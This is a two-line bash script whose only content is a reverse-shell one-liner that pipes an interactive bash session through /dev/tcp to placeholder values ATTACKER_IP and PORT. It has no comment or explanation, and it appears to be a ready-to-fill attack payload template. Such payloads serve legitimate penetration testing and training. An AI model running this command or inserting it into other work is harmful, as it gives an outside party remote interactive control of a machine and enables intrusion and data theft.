#!/bin/bash

bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1
